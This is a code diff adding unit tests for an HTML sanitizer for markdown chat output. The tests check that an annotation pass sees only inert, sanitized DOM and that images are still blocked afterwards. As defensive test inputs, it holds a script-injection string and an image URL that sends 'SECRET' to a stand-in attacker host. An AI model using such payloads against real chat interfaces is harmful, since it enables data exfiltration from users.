@@ -456,6 +456,36 @@ describe('sanitizeMarkdownHtml — the other auto-loading channels stay shut', (
   })
 })
 
+describe('sanitizeMarkdownHtml: the annotate pass (#428)', () => {
+  // The chat's entity and citation annotators run here, on the inert DOM,
+  // instead of re-parsing this function's serialized output with a regex.
+  // These pin where the pass sits: after DOMPurify, before the image pass.
+
+  it('hands the pass the inert, already-sanitized body, never the live page', () => {
+    const seen: Element[] = []
+    sanitizeMarkdownHtml('<p>hi</p><script>window.stolen = 1</script>', (root) => {
+      seen.push(root)
+    })
+
+    expect(seen).toHaveLength(1)
+    expect(seen[0].ownerDocument).not.toBe(document)
+    expect(seen[0].querySelector('script')).toBeNull()
+    expect(seen[0].querySelector('p')?.textContent).toBe('hi')
+  })
+
+  it('judges images after the pass, so the sanitizer has the last word over it', () => {
+    const src = `https://${ATTACKER}/p.png?d=SECRET`
+    const out = sanitizeMarkdownHtml('<p>hi</p>', (root) => {
+      const img = root.ownerDocument.createElement('img')
+      img.setAttribute('src', src)
+      root.append(img)
+    })
+
+    expect(imageSources(out)).toEqual([])
+    expect(placeholders(out)).toEqual([`Image blocked: ${src}`])
+  })
+})
+
 describe('escapeHtmlAttribute', () => {
   it('escapes the characters that can terminate a quoted attribute', () => {
     expect(escapeHtmlAttribute(`a"b'c<d>e&f`)).toBe('a&quot;b&#39;c&lt;d&gt;e&amp;f')
